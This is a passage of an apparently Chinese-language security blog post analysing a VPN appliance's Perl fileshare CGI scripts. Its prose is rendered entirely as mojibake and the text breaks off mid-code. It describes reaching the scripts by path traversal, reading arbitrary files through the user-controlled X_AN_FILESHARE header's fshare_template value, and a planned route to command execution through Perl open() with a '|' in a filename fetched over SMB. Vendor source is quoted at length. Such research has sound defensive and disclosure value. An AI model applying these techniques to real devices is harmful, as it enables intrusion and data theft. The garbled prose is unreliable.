<p>&#x2F;client_sec ç›®å½•ä¸‹æœ‰ä¸€äº›èµ„æºæ–‡ä»¶ï¼Œä½†é‡ç‚¹ä¸åœ¨è¿™é‡Œã€‚æˆ‘ä»¬è€ƒè™‘æ—¢ç„¶å¯ä»¥è®¿é—® &#x2F;ca&#x2F;fileshare&#x2F;htdocs&#x2F;client_sec ä¸‹çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆèƒ½å¦é€šè¿‡è·¯å¾„ç©¿è¶Šç­‰æ‰‹æ®µè®¿é—®åˆ°ä½äº &#x2F;ca&#x2F;fileshare&#x2F;htdocs ä¸‹çš„æ–‡ä»¶å‘¢ï¼Ÿå› ä¸º &#x2F;ca&#x2F;fileshare&#x2F;htdocs ç›®å½•ä¸‹å­˜æ”¾äº†ä¸€äº› perl è„šæœ¬æ–‡ä»¶ï¼Œç»“åˆ lighttpd å¼€å¯äº† cgi æ”¯æŒï¼Œå¦‚æœå¯ä»¥è®¿é—®è¿™äº›æ–‡ä»¶çš„è¯å°±å¯ä»¥è°ƒç”¨å…¶ä¸­çš„åŠŸèƒ½ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_12.png"
                     
                ></p>
<p>æˆ‘ä»¬æ„é€ è¯·æ±‚æµ‹è¯•ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_13.png"
                     
                ></p>
<p>é€šè¿‡åœ¨ URL ä¸­æ·»åŠ è·¯å¾„ç©¿è¶Šå­—ç¬¦ï¼Œç¡®å®å¯ä»¥è®¿é—®åˆ°ä¸Šä¸€å±‚çš„æ–‡ä»¶ã€‚(ç›´æ¥è®¿é—® &#x2F;prx&#x2F;000&#x2F;http&#x2F;localhost&#x2F;acl.pm ä¼šç”±äºä»£ç†æœåŠ¡å™¨è¿”å› 302)</p>
<p>ä¸è¿‡ä»¥ .pm ç»“å°¾çš„æ–‡ä»¶æœåŠ¡å™¨å¹¶ä¸ä¼šæ‰§è¡Œï¼Œè€Œæ˜¯ç›´æ¥è¿”å›å…¶å†…å®¹ï¼Œå°è¯•è®¿é—®æ— æ‹“å±•åçš„è„šæœ¬å¦‚ addfolder:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_14.png"
                     
                ></p>
<p>è¿™æ ·è„šæœ¬ä¸­çš„å†…å®¹å°±è¢«æ‰§è¡Œäº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†æè¿™äº› perl ä»£ç ä¸­æ˜¯å¦å­˜åœ¨é—®é¢˜ã€‚ä¸‹é¢åˆ—ä¸¾ä¸€ä¸ªæ¼æ´ï¼š</p>
<p>åœ¨ addfolder ä¸­å­˜åœ¨è¿™æ ·çš„ä»£ç </p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">$kvars&#123;<span class="string">&#x27;uid&#x27;</span>&#125; = -<span class="number">1</span>;</span><br><span class="line">$kvars&#123;<span class="string">&#x27;gid&#x27;</span>&#125; = -<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">&amp;fileshare::read_kernel_parameters(\%ENV, \%kvars);</span><br></pre></td></tr></table></figure></div>

<p>read_kernel_parameters å‡½æ•°çš„å®šä¹‰ï¼š</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">my</span> $fileshare_header = <span class="string">&quot;HTTP_X_AN_FILESHARE&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">read_kernel_parameters</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($env, $kvars) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $header = $env-&gt;&#123;$fileshare_header&#125;;</span><br><span class="line">	<span class="comment">#my $header = &quot;uname=t; password=t; sp_uname=t; flags=c3248; language=english; acls=file%3a%2a%2f%20AND%20vs%20PERMIT; sp_host=AN; src_ip=192.168.2.151; site_id=vs&quot;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> @pairs = <span class="keyword">split</span>(<span class="regexp">/; ?/</span>, $header);</span><br><span class="line"></span><br><span class="line"><span class="comment">#	&amp;fileshare::debug_log(&quot;fileshare header: &quot; . $header);</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span> (@pairs) &#123;</span><br><span class="line">		<span class="keyword">my</span> ($name, $value) = <span class="keyword">split</span>(<span class="string">&quot;=&quot;</span>, $_);</span><br><span class="line">		<span class="keyword">if</span> ($name eq <span class="string">&quot;acls&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">my</span> @acls;</span><br><span class="line">			&amp;read_acls($value, \@acls);</span><br><span class="line">			$kvars-&gt;&#123;$name&#125; = \@acls;</span><br><span class="line">		&#125; <span class="keyword">elsif</span> ($name eq <span class="string">&quot;res_group_acls&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">my</span> @res_group_acls;</span><br><span class="line">			&amp;read_res_group_acls($value, \@res_group_acls);</span><br><span class="line">			$kvars-&gt;&#123;$name&#125; = \@res_group_acls;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$kvars-&gt;&#123;$name&#125; = &amp;uri_unescape($value);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å‘ç° kvars å‚æ•°ä¸­çš„å†…å®¹å®é™…ä¸Šæ˜¯ç”¨æˆ·è¯·æ±‚å¤´ X_AN_FILESHARE ä¸­çš„å„é¡¹å‚æ•°ï¼Œä»£ç ä¸­ç”¨æ³¨é‡Šåˆ—ä¸¾äº†å¯èƒ½çš„ X_AN_FILESHARE è¯·æ±‚å¤´æ ¼å¼ã€‚</p>
<p>å›åˆ° addfolderï¼Œå½“è¯·æ±‚ç±»å‹ä¸ä¸º POST æ—¶ï¼Œä¼šè°ƒç”¨ fileshare::displayInfo å‡½æ•°</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">displayInfo</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($page, $kvars, $title, $message, $caller_name, $caller_href) = @_;</span><br><span class="line">	<span class="keyword">my</span> $charset = &amp;localization::msg(<span class="string">&#x27;charset&#x27;</span>) || <span class="string">&#x27;UTF-8&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (&amp;is_login_failure($message)) &#123;</span><br><span class="line">		<span class="keyword">print</span> $page-&gt;header(<span class="string">-type =&gt;</span> <span class="string">&quot;text/html; charset=<span class="subst">$&#123;charset&#125;</span>&quot;</span>, <span class="string">-status =&gt;</span> <span class="string">&quot;401 Access Denied&quot;</span>, <span class="string">-WWW_Authenticate =&gt;</span> <span class="string">&quot;_AN_fshare&quot;</span> );</span><br><span class="line">	&#125; <span class="keyword">elsif</span> ($message =~ <span class="regexp">m/^FATAL_ERROR_/</span>) &#123;</span><br><span class="line">		$message =~ <span class="regexp">s/^FATAL_ERROR_//</span>;</span><br><span class="line">		$message =~ <span class="regexp">s/\sat\s.*//</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">print</span> $page-&gt;header(<span class="string">-type =&gt;</span> <span class="string">&quot;text/html; charset=<span class="subst">$&#123;charset&#125;</span>&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> %html_data = &amp;read_template(<span class="keyword">hex</span>($kvars-&gt;&#123;<span class="string">&#x27;flags&#x27;</span>&#125;), $kvars-&gt;&#123;<span class="string">&#x27;change_url&#x27;</span>&#125;,</span><br><span class="line">	                               $title, $kvars-&gt;&#123;<span class="string">&#x27;fshare_template&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $top_html = $html_data&#123;<span class="string">&#x27;top_html&#x27;</span>&#125;;</span><br><span class="line">	<span class="keyword">my</span> $end_html = $html_data&#123;<span class="string">&#x27;end_html&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($top_html eq <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		&amp;last_ditch_error($page, &amp;localization::msg(<span class="number">1</span>)); <span class="comment">#liu</span></span><br><span class="line">		<span class="keyword">exit</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $message_html = &amp;generate_info($title, $message, $caller_name,</span><br><span class="line">	                                  $caller_href);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> $top_html;</span><br><span class="line">	<span class="keyword">print</span> $message_html;</span><br><span class="line">	<span class="keyword">print</span> $end_html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä»£ç ä¼šä½¿ç”¨ is_login_failure å‡½æ•°é‰´æƒï¼Œæ— è®ºæ˜¯å¦é€šè¿‡ï¼Œåé¢éƒ½ä¼šè°ƒç”¨ read_template å‡½æ•°å°è¯•è¯»å–ä¸€ä¸ª HTML æ¨¡æ¿æ–‡ä»¶ï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„ã€‚</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">read_template</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($flags, $reset_pwd_url, $title, $ai_template) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $template = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> $top_html = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> $end_html = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> %html_data = (<span class="string">&#x27;top_html&#x27;</span> =&gt; <span class="string">&quot;&quot;</span>, <span class="string">&#x27;end_html&#x27;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($ai_template) &#123;</span><br><span class="line">		$ai_template = <span class="string">&quot;/ca/fileshare/htdocs/&quot;</span> . $ai_template;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">open</span>(TEMPLATE, <span class="string">&quot;&lt;$ai_template&quot;</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> %html_data;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬çœ‹åˆ°ä»£ç ä¼šä½¿ç”¨ç¬¬å››ä¸ªå‚æ•°å³ fshare_template æ‹¼æ¥ä¸€ä¸ªè·¯å¾„ï¼Œç„¶åæ‰“å¼€å¯¹åº”çš„æ–‡ä»¶è¯»å–å¹¶ä½¿ç”¨å…¶ä¸­å†…å®¹ï¼ŒæœŸé—´ç¼ºå°‘å¯¹æ•°æ®çš„è¿‡æ»¤ï¼Œé€šè¿‡æ„é€ è·¯å¾„ç©¿è¶Š payload å¯ä»¥è¯»å–ä¸€äº›æ•æ„Ÿæ–‡ä»¶ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_15.png"
                     
                ></p>
<p>ç±»ä¼¼çš„â€œå°é—®é¢˜â€è¿˜æœ‰å¾ˆå¤šï¼Œé™äºç¯‡å¹…æˆ‘ä»¬åªä»‹ç»å…¶ä¸­ä¸€ä¸ªã€‚é™¤è¿™äº›å°é—®é¢˜ä¹‹å¤–ï¼Œæˆ‘ä»¬å¸Œæœ›æœ‰ä¸€ç§åŠæ³•èƒ½å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<p>å‚è€ƒ<a class="link"   href="https://www.mi1k7ea.com/2020/11/24/Perl%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" >perl ä»£ç å®¡è®¡<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>æ–‡ç« ï¼Œåœ¨ perl ä¸­é™¤å¸¸è§„çš„ systemã€exec ä¹‹å¤–ï¼Œopen å‡½æ•°ä¹Ÿå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œåªéœ€è¦åœ¨è·¯å¾„çš„æœ€åæ·»åŠ ä¸€ä¸ª <code>|</code> å­—ç¬¦ã€‚åœ¨è®¾å¤‡çš„ perl ä»£ç åº“ä¸­æŸ¥è¯¢ç›¸å…³é£é™©ç‚¹ï¼Œä¼¼ä¹åªæœ‰ open æœ‰åˆ©ç”¨æœºä¼šã€‚</p>
<p>æŸ¥æ‰¾å¼•ç”¨ open å‡½æ•°çš„ä½ç½®ï¼Œå‘ç°åä¸º printFile çš„å‡½æ•°</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">printFile</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> $charset = &amp;localization::msg(<span class="string">&#x27;charset&#x27;</span>) || <span class="string">&#x27;UTF-8&#x27;</span>;</span><br><span class="line">	<span class="keyword">my</span> ($fullname, $type) = @_;</span><br><span class="line">	<span class="keyword">my</span> $fh = FileHandle-&gt;new();</span><br><span class="line">	<span class="keyword">my</span> $filename = basename($fullname);</span><br><span class="line">	<span class="keyword">my</span> $error = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> $buf = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (! <span class="keyword">open</span>($fh, <span class="string">&quot;$fullname&quot;</span>)) &#123;</span><br><span class="line">		$error = &amp;localization::msg(<span class="number">26</span>);</span><br><span class="line">		<span class="keyword">return</span> $error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$contenttype = noRewriteContentType($filename);</span><br><span class="line">	<span class="keyword">if</span> ($contenttype eq <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (-T <span class="string">&quot;$fullname&quot;</span>) &#123;</span><br><span class="line">			$contenttype = <span class="string">&quot;text/plain&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			$contenttype = <span class="string">&quot;application/octet_stream&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($type eq <span class="string">&quot;SMB&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> ($filename =~ <span class="regexp">/:([0-9a-f][0-9a-f])/</span>) &#123;</span><br><span class="line">			$sjisbyte = <span class="keyword">hex</span>($1);</span><br><span class="line">			$sjisbyte = <span class="keyword">pack</span>(<span class="string">&quot;C&quot;</span>, $sjisbyte);</span><br><span class="line">			$filename =~ <span class="regexp">s/:[0-9a-f][0-9a-f]/$sjisbyte/</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span>	<span class="string">&quot;Content-Type:<span class="subst">$&#123;contenttype&#125;</span>;charset=<span class="subst">$&#123;charset&#125;</span>\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># set binary mode</span></span><br><span class="line">	<span class="keyword">binmode</span> STDOUT;</span><br><span class="line">	<span class="keyword">while</span>(<span class="keyword">read</span>($fh, $buf, <span class="number">8192</span>)) &#123; <span class="keyword">print</span> $buf; &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">close</span>($fh);</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ 10 è¡Œè°ƒç”¨äº† open å‡½æ•°å»æ‰“å¼€å¤–éƒ¨ä¼ é€’çš„å‚æ•° $fullnameï¼ŒæŸ¥çœ‹ä½¿ç”¨ printFile çš„ä½ç½®å¯ä»¥å®šä½åˆ°ä½äº cifs æ–‡ä»¶ä¸­çš„ downloadSmbFile å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">downloadSmbFile</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($p, $kvars, $h_ip) = @_;</span><br><span class="line">	<span class="keyword">my</span> $uname = $kvars-&gt;&#123;<span class="string">&#x27;uname&#x27;</span>&#125;;</span><br><span class="line">	<span class="keyword">my</span> $password = $kvars-&gt;&#123;<span class="string">&#x27;password&#x27;</span>&#125;;</span><br><span class="line">	<span class="keyword">my</span> $workgroup = fileshare::get_workgroup($p, $kvars);</span><br><span class="line">	<span class="keyword">my</span> $path = $p-&gt;url_param(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">	<span class="keyword">my</span> $service = $p-&gt;url_param(<span class="string">&#x27;service&#x27;</span>);</span><br><span class="line">	<span class="keyword">my</span> $contenttype = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> $error = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $file = basename($path);</span><br><span class="line">	<span class="keyword">my</span> $dir = dirname($path);</span><br><span class="line"></span><br><span class="line">	$tmpdir = <span class="string">`mktemp -d /tmp/tempfsXXXXXX`</span>;</span><br><span class="line">	<span class="keyword">chomp</span> $tmpdir;</span><br><span class="line">	&amp;secure_common::secureBackticks(<span class="string">&quot;/bin/chmod&quot;</span>, <span class="string">&quot;777&quot;</span>, $tmpdir);</span><br><span class="line">	<span class="keyword">if</span> ($? !=<span class="number">0</span>) &#123;</span><br><span class="line">		$error = &amp;localization::msg(<span class="number">3</span>);</span><br><span class="line">		<span class="keyword">goto</span> DOWNLOADSMBFILE_END;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@service = &amp;cifs_common::parseSmbService($service);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">my</span> $service_name = $service[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">my</span> $service_options = $service[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment"># handle DFS share</span></span><br><span class="line">	<span class="keyword">my</span> $loop_counter = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">my</span> $smbshare = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> ($loop_counter &lt; $dfs_common::MAX_DFS_HOPS) &#123;    <span class="comment"># max = 8</span></span><br><span class="line">		$loop_counter++;</span><br><span class="line"></span><br><span class="line">		$smbshare = &amp;secure_common::secureBackticks(<span class="string">&#x27;/ca/fileshare/samba/bin/smbclient&#x27;</span>,</span><br><span class="line">			<span class="string">&quot;$service_name&quot;</span>,</span><br><span class="line">			<span class="string">&quot;$password&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;-U&#x27;</span>, <span class="string">&quot;$uname&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;-W&#x27;</span>, <span class="string">&quot;$workgroup&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;-c&#x27;</span>, <span class="string">&quot;AfterLogOnCmd;cd \&quot;$dir\&quot;;AfterCdCmd;get \&quot;$file\&quot; \&quot;$tmpdir/$file\&quot;;AfterGetCmd&quot;</span>,</span><br><span class="line">			<span class="string">&quot;$service_options&quot;</span>);</span><br><span class="line"></span><br><span class="line">		$error = &amp;cifs_common::getSmbConnInfo($smbshare);</span><br><span class="line">		<span class="keyword">if</span> ($error <span class="keyword">ne</span> <span class="string">&quot;Success&quot;</span>) &#123;</span><br><span class="line">			$error = &amp;cifs_common::printSmbConnError($error);    <span class="comment"># è·å–æ–‡ä»¶å¤±è´¥</span></span><br><span class="line">			<span class="keyword">goto</span> DOWNLOADSMBFILE_END;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$error = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$error = &amp;cifs_common::getSmbCmdInfo($smbshare,</span><br><span class="line">						<span class="string">&quot;AfterLogOnCmd: command not found&quot;</span>,</span><br><span class="line">						<span class="string">&quot;AfterCdCmd: command not found&quot;</span>);</span><br><span class="line">		<span class="comment"># check for DFS share</span></span><br><span class="line">		<span class="keyword">my</span> $check_dfs = &amp;dfs_common::smbDfsError($error);</span><br><span class="line">		<span class="keyword">if</span> ($check_dfs <span class="keyword">ne</span> <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">			($service_name, $dir, $h_ip) =</span><br><span class="line">				&amp;dfs_common::smbDfsReferral($smbshare, $service_name, $dir,</span><br><span class="line">								$h_ip, $kvars-&gt;&#123;<span class="string">&#x27;site_id&#x27;</span>&#125;);</span><br><span class="line">			<span class="keyword">next</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">last</span>;</span><br><span class="line">	&#125; <span class="comment"># end while loop</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($error <span class="keyword">ne</span> <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		$error = &amp;localization::msg(<span class="number">115</span>,$dir);    <span class="comment"># Cannot change directory to $_ANs</span></span><br><span class="line">		<span class="keyword">goto</span> DOWNLOADSMBFILE_END;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	$error = &amp;cifs_common::getSmbCmdInfo($smbshare, <span class="string">&quot;AfterCdCmd: command not found&quot;</span>, <span class="string">&quot;AfterGetCmd: command not found&quot;</span>);</span><br><span class="line">	$error = parseSmbGetResult($error);</span><br><span class="line">	<span class="keyword">if</span> ($error <span class="keyword">ne</span> <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( $error eq <span class="string">&quot;NT_STATUS_ACCESS_DENIED&quot;</span> ) &#123;</span><br><span class="line">			$error = &amp;localization::msg(<span class="number">116</span>, $file);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			$error = &amp;localization::msg(<span class="number">117</span>, $file);</span><br><span class="line">		&#125;</span><br><span class="line">		&amp;fastlog::perl_fastlog(fastlog::LOG_NOTICE, $fastlog_method, $fastlog_code_permission_fail, $fastlog_msg_permission_fail, \%fastlog_optional);</span><br><span class="line">		<span class="keyword">goto</span> DOWNLOADSMBFILE_END;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($error eq <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		$error = &amp;fileshare::printFile(<span class="string">&quot;$tmpdir/$file&quot;</span>, <span class="string">&quot;SMB&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($error eq <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		$fastlog_optional&#123;<span class="string">&#x27;rcvd&#x27;</span>&#125; = (<span class="keyword">stat</span> <span class="string">&quot;$tmpdir/$file&quot;</span>)[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">		&amp;fastlog::perl_fastlog(fastlog::LOG_INFO, $fastlog_method,</span><br><span class="line">							   $fastlog_code_success, $fastlog_msg_success,</span><br><span class="line">							   \%fastlog_optional);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DOWNLOADSMBFILE_END:</span><br><span class="line"></span><br><span class="line">	&amp;secure_common::secureBackticks(<span class="string">&quot;rm&quot;</span>, <span class="string">&quot;-rf&quot;</span>, $tmpdir);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($error <span class="keyword">ne</span> <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">		&amp;fileshare::displayInfo($p, $kvars, &amp;localization::msg(<span class="number">26</span>), $error,</span><br><span class="line">		                        <span class="keyword">undef</span>, <span class="keyword">undef</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç®€å•æ¥è¯´ï¼Œè¿™ä¸ªå‡½æ•°è´Ÿè´£ä»è¿œç¨‹ SMB æœåŠ¡å™¨ä¸Šä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œç”¨æˆ·å¯ä»¥æä¾›æœåŠ¡å™¨çš„åœ°å€ã€æ–‡ä»¶è·¯å¾„ã€ç”¨æˆ·åå’Œå¯†ç ç­‰å‚æ•°ï¼Œæœ€åä»£ç ä¼šè°ƒç”¨ secureBackticks å‡½æ•°ä»¥æ•°ç»„æ–¹å¼æ‰§è¡Œ smbclient ç¨‹åºï¼Œå®Œæˆä¸‹è½½æ–‡ä»¶æ“ä½œã€‚è¿™é‡Œå¯ä»¥æ§åˆ¶ smbclient çš„å„é¡¹å‚æ•°ï¼Œä½†æ˜¯å¹¶ä¸èƒ½ç›´æ¥è·å– shellã€‚</p>
<p>åœ¨è°ƒç”¨ printFile å‡½æ•°çš„ä½ç½®ä¼šç”¨ $tmpdir å’Œ $file ä¸¤ä¸ªå‚æ•°æ‹¼æ¥ä¸€ä¸ªè·¯å¾„ï¼Œå…¶ä¸­ $file å‚æ•°å³ $path æ˜¯ç”¨æˆ·å¯æ§çš„ã€‚çœ‹èµ·æ¥åªéœ€è¦æ§åˆ¶ $path å‚æ•°å³å¯å®ç°å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯ä»”ç»†è§‚å¯Ÿä»£ç é€»è¾‘å‘ç°å¹¶æ²¡æœ‰è¿™ä¹ˆç®€å•ã€‚åªæœ‰å½“ $error ä¸ºç©ºï¼Œå³ä» smb æœåŠ¡å™¨å–å›æ–‡ä»¶æ—¶æ²¡æœ‰å‡ºé”™æ‰èƒ½æ‰§è¡Œ printFile å‡½æ•°ã€‚</p>
<p>æœ€åˆæˆ‘æƒ³åˆ°å…ˆåœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ­å»ºä¸€ä¸ª SMB æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ä¸­æ”¾ä¸€ä¸ªæ–‡ä»¶åå¸¦æœ‰ <code>|</code> å­—ç¬¦çš„æ–‡ä»¶ï¼Œç„¶åæ­£å¸¸æ„é€ å„ä¸ªå‚æ•°è®© smbclient å–å›è¿™ä¸ªæ–‡ä»¶ï¼Œä¸è¿‡ SMB æœåŠ¡ä¸èƒ½æ”¯æŒæ–‡ä»¶åå¸¦æœ‰ <code>|</code> çš„æ–‡ä»¶ã€‚</p>
<p>ä¾‹å¦‚ä»¥ä¸‹æµ‹è¯•ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_16.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_17.png"
                     
                ></p>
<p>è¿™ä¸ªåŒ…å«éæ³•å­—ç¬¦çš„æ–‡ä»¶ä¼šè¢«è‡ªåŠ¨é‡å‘½åã€‚</p>
<p>é‚£ä¹ˆè¿™ä¸ªä½ç½®å°±æ— æ³•åˆ©ç”¨äº†å—ï¼Ÿæˆ‘ä»¬ä»”ç»†è§‚å¯Ÿä»£ç é€»è¾‘ï¼Œåœ¨åˆ¤æ–­å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸæ—¶è°ƒç”¨äº†å‡½æ•° getSmbConnInfo ä»¥åŠ getSmbCmdInfo</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">getSmbConnInfo</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($output) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($output =~ <span class="regexp">/AfterLogOnCmd: command not found/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($output =~ <span class="regexp">/STATUS_DUPLICATE_NAME/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;NT_STATUS_DUPLICATE_NAME&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	@output = <span class="keyword">split</span>(<span class="string">&quot; &quot;</span>, $output);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $output[<span class="keyword">scalar</span>(@output)-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">getSmbCmdInfo</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($output, $delimiter1, $delimiter2) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (! $output =~ <span class="regexp">/^$delimiter1$/m</span> ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (! $output =~ <span 